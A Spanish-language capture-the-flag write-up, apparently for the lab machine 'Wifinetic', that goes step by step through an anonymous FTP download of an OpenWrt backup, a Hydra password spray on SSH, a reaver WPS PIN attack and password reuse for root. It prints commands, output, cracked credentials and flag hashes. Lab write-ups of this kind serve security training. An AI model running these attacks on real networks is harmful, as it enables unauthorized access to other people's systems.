>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/wifinetic]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.229.90
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-17 10:55 EST
Nmap scan report for 10.129.229.90
Host is up (0.060s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

>Vemos un servicio **FTP** con **login anónimo** habilitado, así que vamos a acceder y llevarnos todo su contenido:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/wifinetic]
└─$ ftp 10.129.229.90                                                                                                                                     
Connected to 10.129.229.90.
220 (vsFTPd 3.0.3)
Name (10.129.229.90:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mget *
mget MigrateOpenWrt.txt [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||44858|)
150 Opening BINARY mode data connection for MigrateOpenWrt.txt (4434 bytes).
100% |*************************************************************************************************************************************************|  4434        7.07 MiB/s    00:00 ETA
226 Transfer complete.
4434 bytes received in 00:00 (70.49 KiB/s)
229 Entering Extended Passive Mode (|||43241|)
150 Opening BINARY mode data connection for ProjectGreatMigration.pdf (2501210 bytes).
100% |*************************************************************************************************************************************************|  2442 KiB    1.96 MiB/s    00:00 ETA
226 Transfer complete.
2501210 bytes received in 00:01 (1.87 MiB/s)
229 Entering Extended Passive Mode (|||43818|)
150 Opening BINARY mode data connection for ProjectOpenWRT.pdf (60857 bytes).
100% |*************************************************************************************************************************************************| 60857      476.83 KiB/s    00:00 ETA
226 Transfer complete.
60857 bytes received in 00:00 (320.71 KiB/s)
229 Entering Extended Passive Mode (|||43587|)
150 Opening BINARY mode data connection for backup-OpenWrt-2023-07-26.tar (40960 bytes).
100% |*************************************************************************************************************************************************| 40960      642.44 KiB/s    00:00 ETA
226 Transfer complete.
40960 bytes received in 00:00 (325.09 KiB/s)
229 Entering Extended Passive Mode (|||41168|)
150 Opening BINARY mode data connection for employees_wellness.pdf (52946 bytes).
100% |*************************************************************************************************************************************************| 52946      423.88 KiB/s    00:00 ETA
226 Transfer complete.
52946 bytes received in 00:00 (283.37 KiB/s)
```

>Aquí vemos lo siguiente:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/wifinetic]
└─$ tree                                  
.
├── backup-OpenWrt-2023-07-26.tar
├── employees_wellness.pdf
├── etc
│   ├── config
│   │   ├── dhcp
│   │   ├── dropbear
│   │   ├── firewall
│   │   ├── luci
│   │   ├── network
│   │   ├── rpcd
│   │   ├── system
│   │   ├── ucitrack
│   │   ├── uhttpd
│   │   └── wireless
│   ├── dropbear
│   │   ├── dropbear_ed25519_host_key
│   │   └── dropbear_rsa_host_key
│   ├── group
│   ├── hosts
│   ├── inittab
│   ├── luci-uploads
│   ├── nftables.d
│   │   ├── 10-custom-filter-chains.nft
│   │   └── README
│   ├── opkg
│   │   └── keys
│   │       └── 4d017e6f1ed5d616
│   ├── passwd
│   ├── profile
│   ├── rc.local
│   ├── shells
│   ├── shinit
│   ├── sysctl.conf
│   ├── uhttpd.crt
│   └── uhttpd.key
├── MigrateOpenWrt.txt
├── ProjectGreatMigration.pdf
└── ProjectOpenWRT.pdf
```

>En el archivo `etc/config/wireless` vemos unas credenciales de un **Access Point**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/wifinetic]
└─$ cat etc/config/wireless 

<SNIP>

config wifi-iface 'wifinet0'
	option device 'radio0'
	option mode 'ap'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
	option wps_pushbutton '1'

config wifi-iface 'wifinet1'
	option device 'radio1'
	option mode 'sta'
	option network 'wwan'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
```

>Por otro lado, en `etc/passwd` vemos nombres de usuarios que son válidos:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/wifinetic]
└─$ cat etc/passwd         
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

>Vamos a intentar hacer un **Password Spray** en el servicio SSH a ver si algún usuario tiene las credenciales encontradas en el AP: `netadmin:VeRyUniUqWiFIPasswrd1!`

```bash
# Creamos la lista de usuarios:
┌──(kali㉿jbkira)-[~/Desktop/machines/wifinetic]
└─$ cat etc/passwd | awk {'print $1'} FS=":" > users

# Hacemos el password spray:
┌──(kali㉿jbkira)-[~/Desktop/machines/wifinetic]
└─$ hydra -L users -p 'VeRyUniUqWiFIPasswrd1!' ssh://10.129.229.90
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-17 11:05:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
[DATA] attacking ssh://10.129.229.90:22/
[22][ssh] host: 10.129.229.90   login: netadmin   password: VeRyUniUqWiFIPasswrd1!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-17 11:05:12
```

>Entramos por **SSH** con las credenciales encontradas y leemos la primera flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/wifinetic]
└─$ ssh netadmin@10.129.229.90                                       

<SNIP>

netadmin@wifinetic:~$ cat user.txt 
ef4df2432c00226dec5f2ba48271f63b
```

>Vemos que hay interfaces de red inalámbricas:

```bash
netadmin@wifinetic:/$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.229.90  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:fe94:abd4  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:fe94:abd4  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:ab:d4  txqueuelen 1000  (Ethernet)
        RX packets 71510  bytes 4377339 (4.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 67169  bytes 6394673 (6.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1536  bytes 92232 (92.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1536  bytes 92232 (92.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 10342  bytes 1822244 (1.8 MB)
        RX errors 0  dropped 10342  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 352  bytes 33756 (33.7 KB)
        RX errors 0  dropped 47  overruns 0  frame 0
        TX packets 428  bytes 50292 (50.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 115  bytes 15582 (15.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 352  bytes 40092 (40.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

>Si enumeramos las interfaces de red inalámbricas con `iwconfig` deducimos lo siguiente:

```bash
netadmin@wifinetic:/$ iwconfig
wlan1     IEEE 802.11  ESSID:"OpenWrt"  
          Mode:Managed  Frequency:2.412 GHz  Access Point: 02:00:00:00:00:00   
          Bit Rate:6 Mb/s   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=70/70  Signal level=-30 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:8   Missed beacon:0

eth0      no wireless extensions.

wlan0     IEEE 802.11  Mode:Master  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
hwsim0    no wireless extensions.

wlan2     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
lo        no wireless extensions.
```

-  **wlan0**: Esta interfaz está en **modo maestro**, lo que indica que está configurada como **punto de acceso** (AP). 
-  **wlan1**: Esta interfaz está en **modo cliente**, lo que confirma que funciona como **cliente Wi-Fi**, conectándose a otra red inalámbrica. 
-  **mon0**: esta interfaz está en **modo monitor**, que se utiliza habitualmente para la supervisión y las pruebas de redes inalámbricas. No participa en las actividades habituales de cliente o AP.
-  **wlan2**: esta interfaz está en **modo gestionado**, pero no está asociada a ninguna red. Parece estar inactiva en este momento.

>Ahora usaremos `iw` para explorar más a fondo las interfaces de red:

```bash
netadmin@wifinetic:/$ iw dev
phy#2
	Interface mon0
		ifindex 7
		wdev 0x200000002
		addr 02:00:00:00:02:00
		type monitor
		txpower 20.00 dBm
	Interface wlan2
		ifindex 5
		wdev 0x200000001
		addr 02:00:00:00:02:00
		type managed
		txpower 20.00 dBm
phy#1
	Unnamed/non-netdev interface
		wdev 0x100000023
		addr 42:00:00:00:01:00
		type P2P-device
		txpower 20.00 dBm
	Interface wlan1
		ifindex 4
		wdev 0x100000001
		addr 02:00:00:00:01:00
		ssid OpenWrt
		type managed
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 20.00 dBm
phy#0
	Interface wlan0
		ifindex 3
		wdev 0x1
		addr 02:00:00:00:00:00
		ssid OpenWrt
		type AP
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 20.00 dBm
```

- **wlan0**: Esta interfaz está clasificada como un **AP** (punto de acceso) y está asociada con **phy0** , que representa el **dispositivo inalámbrico físico**. Como era de esperar, esto confirma que **wlan0** es, efectivamente, el punto de acceso en la configuración de **OpenWRT**.
- **wlan1**: esta interfaz está clasificada como **gestionada** y tiene un tipo de **interfaz no net-dev de dispositivo P2P** . El modo gestionado indica que **wlan1** se utiliza como un **cliente Wi-Fi** normal, y el tipo de dispositivo **P2P** sugiere que puede **admitir Wi-Fi Direct** o **comunicaciones entre pares**.
- **phy2, wlan2 y mon0**: Estas interfaces están vinculadas con **phy2**, que representa un **dispositivo inalámbrico físico independiente**. **wlan2** se clasifica como una **interfaz gestionada**, mientras que **mon0** se establece en modo **monitor**. La presencia tanto de **wlan2** como de **mon0** en **phy2** indica que forman parte de la **misma tarjeta inalámbrica**.

<img width="845" height="647" alt="image" src="https://github.com/user-attachments/assets/b6c8f42e-9f0b-4eef-9278-e22be50f8059" />

>Intentar forzar el **PIN WPS** podría llevar a obtener la **contraseña Wi-Fi real**. Ahora comprobaremos si tenemos alguna herramienta preinstalada que tenga **capabilities** configuradas para realizar **actividades** relacionadas con la **red**:

```bash
netadmin@wifinetic:/$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

>Ahora, podemos realizar un ataque **WPS PIN** utilizando `reaver` . Para realizar el ataque WPS PIN, necesitamos el **BSSID** (Basic Service Set Identifier) del **punto de acceso**. Este **BSSID** identifica de **forma única** el AP, y tenerlo nos permite dirigir el ataque a un AP específico.

>Para obtener el BSSID, podemos utilizar la herramienta `wash` o el output del comando `iw`, en este caso, con el output del comando `iw` empleado anteriormente deducimos que el **BSSID** será **02:00:00:00:00:00**:

```bash
<SNIP>
phy#1
	Unnamed/non-netdev interface
		wdev 0x100000023
		addr 42:00:00:00:01:00
		type P2P-device
		txpower 20.00 dBm
	Interface wlan1
		ifindex 4
		wdev 0x100000001
		addr 02:00:00:00:01:00
		ssid OpenWrt
		type managed
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 20.00 dBm
phy#0
	Interface wlan0
		ifindex 3
		wdev 0x1
		addr 02:00:00:00:00:00
		ssid OpenWrt
		type AP
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 20.00 dBm
```

>Tras usar `reaver` para realizar el **WPS PIN Attack** aprovechando que sabemos que emplea el **canal 1** y tenemos una interfaz de **monitoreo**, obtuvimos que el WPS PIN es **12345670** y las credenciales WPA PSK son `WhatIsRealAnDWhAtIsNot51121!`

```bash
netadmin@wifinetic:/$ reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching mon0 to channel 1
[+] Waiting for beacon from 02:00:00:00:00:00
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
```

>Ahora si empleamos estas credenciales para loguearnos con `su` como el usuario **root**, vemos que las credenciales son válidas y leemos la última flag:

```bash
netadmin@wifinetic:/$ su root
Password: 
root@wifinetic:/# cat /root/root.txt
2b346f7ec6832dba22cacebf2ddab2da
```


